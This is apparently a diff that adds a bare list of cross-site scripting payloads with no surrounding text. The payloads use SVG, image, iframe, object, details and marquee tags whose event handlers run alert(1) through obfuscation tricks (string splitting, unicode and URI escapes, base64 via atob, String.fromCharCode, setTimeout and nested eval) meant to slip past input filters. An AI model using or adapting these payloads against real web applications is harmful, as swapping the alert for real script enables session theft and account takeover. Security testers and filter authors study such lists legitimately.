@@ -1,0 +1,31 @@
+```html
+<svg onload=window['al'+'\u0065rt'](1)>
+<img src=x onerror=window['al'+'\u0065rt'](1)>
+<iframe srcdoc="<svg onload=window['al'+'\u0065rt'](1)>"></iframe>
+<iframe srcdoc="<img src=x onerror=window['al'+'\u0065rt'](1)>"></iframe>
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>
+<img src=x onerror=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>
+<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>"></iframe>
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=setTimeout('al'+'ert(1)',0)>
+<img src=x onerror=setTimeout('al'+'ert(1)',0)>
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(1)',0)>"></iframe>
+<iframe srcdoc="<img src=x onerror=setTimeout('al'+'ert(1)',0)>"></iframe>
+<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<img src=x onerror=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>
+<iframe srcdoc="<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>"></iframe>
+<iframe srcdoc="<img src=x onerror=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>"></iframe>
+<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>
+<img src=x onerror=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>"></iframe>
+<iframe srcdoc="<img src=x onerror=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>"></iframe>
+<object data="javascript:al%65rt(1)"></object>
+<details open ontoggle=window['al'+'\u0065rt'](1)>
+<marquee onstart=window['al'+'\u0065rt'](1)>
+```
